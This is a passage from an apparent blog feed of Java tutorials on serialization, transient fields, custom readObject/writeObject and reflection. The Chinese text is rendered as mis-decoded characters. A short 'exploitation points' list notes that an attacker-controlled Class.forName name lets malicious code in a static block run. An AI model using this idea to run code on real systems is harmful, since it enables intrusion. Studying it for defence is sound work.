title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><ol><li>åˆ›å»ºä¸€ä¸ªObjectOutputStreamè¾“å‡ºæµ</li><li>è°ƒç”¨ObjectOutputStreamå¯¹è±¡çš„writeObjectè¾“å‡ºå¯åºåˆ—åŒ–å¯¹è±¡</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;<span class="comment">//å®ç°Serializableæ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WriteObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//åˆ›å»ºä¸€ä¸ªObjectOutStreamæµ</span></span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:\\test.txt&quot;</span>));</span><br><span class="line">            <span class="comment">//å°†å¯¹è±¡åºåˆ—åŒ–åˆ°æ–‡ä»¶</span></span><br><span class="line">            Person person = <span class="keyword">new</span> Person(<span class="string">&quot;wawyw&quot;</span>, <span class="number">18</span>);</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;åºåˆ—åŒ–æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><ol><li>åˆ›å»ºä¸€ä¸ªObjectInputStreamè¾“å…¥æµ</li><li>è°ƒç”¨ObjectInputStreamå¯¹è±¡çš„readObject()å¾—åˆ°åºåˆ—åŒ–çš„å¯¹è±¡</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;<span class="comment">//å®ç°Serializableæ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;ååºåˆ—åŒ–è°ƒç”¨æˆ‘è¿™ä¸ªæ„é€ æ–¹æ³•äº†å˜›ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//åˆ›å»ºObjectInputStreamæµ</span></span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\test.txt&quot;</span>));</span><br><span class="line">            Person wawyw = (Person) ois.readObject(); <span class="comment">//ååºåˆ—åŒ–æˆå¯¹è±¡</span></span><br><span class="line">            System.out.println(wawyw);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Person&#123;name=&#x27;wawyw&#x27;, age=18&#125;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºå‘Šè¯‰æˆ‘ä»¬ï¼Œååºåˆ—åŒ–å¹¶ä¸ä¼šè°ƒç”¨æ„é€ æ–¹æ³•ã€‚ååºåˆ—çš„å¯¹è±¡æ˜¯ç”±JVMè‡ªå·±ç”Ÿæˆçš„å¯¹è±¡ï¼Œä¸é€šè¿‡æ„é€ æ–¹æ³•ç”Ÿæˆã€‚</p><h2 id="transient"><a href="#transient" class="headerlink" title="transient"></a>transient</h2><p>ä½¿ç”¨transientå…³é”®å­—é€‰æ‹©ä¸éœ€è¦åºåˆ—åŒ–çš„å­—æ®µã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//ä¸åºåˆ—åŒ–å¹´é¾„å’Œåå­—</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> height;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">boolean</span> singlehood;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, height=&quot;</span> + height +</span><br><span class="line">                <span class="string">&quot;, singlehood=&quot;</span> + singlehood +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TransientTest</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;<span class="comment">//åˆ›å»ºObjectOutputStreamæµ</span></span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:\\a.txt&quot;</span>));</span><br><span class="line">            <span class="comment">//åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">            Person person = <span class="keyword">new</span> Person(<span class="string">&quot;wawyw&quot;</span>,<span class="number">18</span>);</span><br><span class="line">            <span class="comment">//åºåˆ—åŒ–å®ƒ</span></span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            <span class="comment">//åˆ›å»ºObjectInputStreamæµ</span></span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\a.txt&quot;</span>));</span><br><span class="line">            <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">            Person wawyw = (Person) ois.readObject();</span><br><span class="line">            <span class="comment">//æ‰“å°å‡ºæ¥</span></span><br><span class="line">            System.out.println(wawyw);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Person&#123;name=&#x27;null&#x27;, age=0, height=0, singlehood=false&#125;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨transientä¿®é¥°çš„å±æ€§ï¼Œjavaåºåˆ—åŒ–æ—¶ï¼Œä¼šå¿½ç•¥æ‰æ­¤å­—æ®µï¼Œæ‰€ä»¥ååºåˆ—åŒ–å‡ºçš„å¯¹è±¡ï¼Œè¢«transientä¿®é¥°çš„å±æ€§æ˜¯é»˜è®¤å€¼ã€‚å¯¹äºå¼•ç”¨ç±»å‹ï¼Œå€¼æ˜¯nullï¼›åŸºæœ¬ç±»å‹ï¼Œå€¼æ˜¯0ï¼›booleanç±»å‹ï¼Œå€¼æ˜¯falseã€‚</p><h2 id="è‡ªå®šä¹‰åºåˆ—åŒ–"><a href="#è‡ªå®šä¹‰åºåˆ—åŒ–" class="headerlink" title="è‡ªå®šä¹‰åºåˆ—åŒ–"></a>è‡ªå®šä¹‰åºåˆ—åŒ–</h2><p>javaæä¾›äº†å¯é€‰çš„è‡ªå®šä¹‰åºåˆ—åŒ–ã€‚å¯ä»¥è¿›è¡Œæ§åˆ¶åºåˆ—åŒ–çš„æ–¹å¼ï¼Œæˆ–è€…å¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œç¼–ç åŠ å¯†ç­‰ã€‚</p><p>é€šè¿‡é‡å†™writeObjectä¸readObjectæ–¹æ³•ï¼Œå¯ä»¥è‡ªå·±é€‰æ‹©å“ªäº›å±æ€§éœ€è¦åºåˆ—åŒ–ï¼Œ å“ªäº›å±æ€§ä¸éœ€è¦ã€‚å¦‚æœwriteObjectä½¿ç”¨æŸç§è§„åˆ™åºåˆ—åŒ–ï¼Œåˆ™ç›¸åº”çš„readObjectéœ€è¦ç›¸åçš„è§„åˆ™ååºåˆ—åŒ–ï¼Œä»¥ä¾¿èƒ½æ­£ç¡®ååºåˆ—åŒ–å‡ºå¯¹è±¡ã€‚è¿™é‡Œå±•ç¤ºå¯¹åå­—è¿›è¡Œåè½¬åŠ å¯†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="comment">//çœç•¥æ„é€ æ–¹æ³•ï¼ŒgetåŠsetæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//å°†åå­—åè½¬å†™å…¥äºŒè¿›åˆ¶æµ</span></span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(<span class="keyword">this</span>.name).reverse());</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ins)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//å°†è¯»å‡ºçš„å­—ç¬¦ä¸²åè½¬æ¢å¤å›æ¥</span></span><br><span class="line">        <span class="keyword">this</span>.name = ((StringBuffer)ins.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.age = ins.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„æœºåˆ¶</title>
      <link href="posts/30031.html"/>
      <url>posts/30031.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯Javaåå°„ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Javaåå°„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Javaåå°„ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Javaåå°„ï¼Ÿ</h1><p>Javaåå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºJavaçš„åå°„æœºåˆ¶ã€‚</p><p>åå°„å°±æ˜¯æŠŠJavaç±»ä¸­çš„å„ç§æˆåˆ†æ˜ å°„æˆä¸€ä¸ªä¸ªçš„Javaå¯¹è±¡ã€‚</p><p>åœ¨Javaä¸­ï¼Œæ¯ä¸ªç±»éƒ½å¯¹åº”ä¸€ä¸ªClasså¯¹è±¡ï¼Œå…¶åå°„æœºåˆ¶æ˜¯é€šè¿‡è·å–è¯¥ç±»çš„Classå¯¹è±¡ï¼Œç„¶åè·å–åˆ°å…¶ç±»çš„æˆå‘˜æ–¹æ³•(<code>Methods</code>)ã€æˆå‘˜å˜é‡(<code>Fields</code>)ã€æ„é€ æ–¹æ³•(<code>Constructors</code>)ç­‰ä¿¡æ¯ï¼ŒåŒæ—¶å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰æ¥ä½“ç°çš„ã€‚</p><h1 id="åå°„æœºåˆ¶"><a href="#åå°„æœºåˆ¶" class="headerlink" title="åå°„æœºåˆ¶"></a>åå°„æœºåˆ¶</h1><h2 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h2><ol><li><p>é€šè¿‡Classç±»ä¸­çš„é™æ€æ–¹æ³•<code>forName()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;å…¨ç±»å&quot;</span>) <span class="comment">// åŒ…å.ç±»å</span></span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡ä»»ä½•æ•°æ®ç±»å‹éƒ½æœ‰çš„classå±æ€§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç±»å.classå±æ€§</span><br></pre></td></tr></table></figure></li><li><p>é€šè¿‡Objectç±»çš„<code>getClass()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹è±¡.getClass()æ–¹æ³•</span><br></pre></td></tr></table></figure><p>ä¾‹å­ï¼šè·å–Personç±»å¯¹åº”çš„Classå¯¹è±¡</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException</span>&#123;</span><br><span class="line">        Class c1=Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">        Class c2=Person.class;</span><br><span class="line">        Person p=<span class="keyword">new</span> Person(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        Class c3=p.getClass();</span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//class domain.Person</span></span><br><span class="line"><span class="comment">//class domain.Person</span></span><br><span class="line"><span class="comment">//class domain.Person</span></span><br></pre></td></tr></table></figure><p><strong>è·å–å†…éƒ¨ç±»çš„Classså¯¹è±¡</strong></p><p>Javaçš„æ™®é€šç±» C1 ä¸­æ”¯æŒç¼–å†™å†…éƒ¨ç±» C2 ï¼Œè€Œåœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼š <code>C1.class</code> å’Œ <code>C1$C2.class</code>ï¼Œå¯ä»¥æŠŠä»–ä»¬çœ‹ä½œä¸¤ä¸ªæ— å…³çš„ç±»ã€‚å³<code>Class.forName(&quot;C1$C2&quot;)</code>å¯ä»¥è·å–åˆ°è¯¥å†…éƒ¨ç±»çš„Classå¯¹è±¡ã€‚</p><h2 id="ç±»çš„åˆå§‹åŒ–"><a href="#ç±»çš„åˆå§‹åŒ–" class="headerlink" title="ç±»çš„åˆå§‹åŒ–"></a>ç±»çš„åˆå§‹åŒ–</h2><p>é»˜è®¤æƒ…å†µä¸‹</p><p><code>Class.forName(className, true, currentLoader)</code></p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueè¡¨ç¤ºåœ¨è·å–Classå¯¹è±¡æ—¶ï¼Œå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>é‚£ä¹ˆåˆå§‹åŒ–æ—¶ï¼Œå…¶è°ƒç”¨çš„æ˜¯ç±»çš„ä»€ä¹ˆæ–¹æ³•å‘¢ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨åˆå§‹å—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†é™æ€åˆå§‹å—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;è°ƒç”¨äº†æ„é€ å‡½æ•°&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–Classå¯¹è±¡æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException</span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;domain.Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è°ƒç”¨äº†é™æ€åˆå§‹å—</span></span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> domain.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException</span>&#123;</span><br><span class="line">        Person p=<span class="keyword">new</span> Person();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è°ƒç”¨äº†é™æ€åˆå§‹å— </span></span><br><span class="line"><span class="comment">// è°ƒç”¨åˆå§‹å—</span></span><br><span class="line"><span class="comment">//è°ƒç”¨äº†æ„é€ å‡½æ•°</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç±»çš„åˆå§‹åŒ–æ˜¯è°ƒç”¨çš„é™æ€åˆå§‹å—ï¼Œå®ä¾‹åŒ–æ—¶ä¼šå…ˆè°ƒç”¨é™æ€åˆå§‹å¿«ã€åˆå§‹å—æœ€åæ˜¯æ„é€ å‡½æ•°ã€‚</p><p>è¡¥å……ï¼šå…·æœ‰çˆ¶ç±»çš„ç±»çš„å®ä¾‹åŒ–ï¼š<code>çˆ¶ç±»é™æ€åˆå§‹å—</code>-&gt;<code>å­ç±»é™æ€åˆå§‹å—</code>-&gt;<code>çˆ¶ç±»åˆå§‹å—</code>-&gt;<code>çˆ¶ç±»æ„é€ å‡½æ•°</code>-&gt;<code>å­ç±»åˆå§‹å—</code>-&gt;<code>å­ç±»æ„é€ å‡½æ•°</code></p><p>å…·æœ‰çˆ¶ç±»çš„ç±»çš„åˆå§‹åŒ–ï¼š<code>çˆ¶ç±»é™æ€åˆå§‹å—</code>-&gt;<code>å­ç±»é™æ€åˆå§‹å—</code></p><p>åˆ©ç”¨ç‚¹ï¼š</p><ul><li>å¦‚æœç¨‹åº<code>Class.forName(name)</code> ä¸­ï¼Œ<code>name</code> å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç¼–å†™â¼€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨ static {} ä¸­ï¼Œä»â½½æ‰§â¾æ¶æ„ä»£ç ã€‚</li><li>å¦‚æœç¨‹åºä¸­æŸä¸ªç±»çš„staticä»£ç å—å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹å…¶ä¿®æ”¹ç„¶åé€šè¿‡<code>Class.forName(name)</code>è°ƒç”¨ã€‚</li></ul><h2 id="è·å–æˆå‘˜å˜é‡"><a href="#è·å–æˆå‘˜å˜é‡" class="headerlink" title="è·å–æˆå‘˜å˜é‡"></a>è·å–æˆå‘˜å˜é‡</h2><ul><li><p><code>Fields[] getFields()</code>ï¼šåªèƒ½è·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡</p></li><li><p><code>Fields getField(String name)</code>ï¼šè·å–ç‰¹å®šæˆå‘˜å˜é‡</p></li><li><p><code>Fields[] getDeclaredFields()</code>ï¼šè·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦</p></li><li><p><code>Fields getDeclaredField(String name)</code>ï¼šè·å–ç‰¹å®šçš„æˆå‘˜å˜é‡ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦</p></li></ul><h2 id="è·å–æ„é€ æ–¹æ³•"><a href="#è·å–æ„é€ æ–¹æ³•" class="headerlink" title="è·å–æ„é€ æ–¹æ³•"></a>è·å–æ„é€ æ–¹æ³•</h2><ul><li><p><code>Constructor&lt;?&gt;[] getConstructors()</code>: åªèƒ½è·å–æ‰€æœ‰publicä¿®é¥°çš„æ„é€ 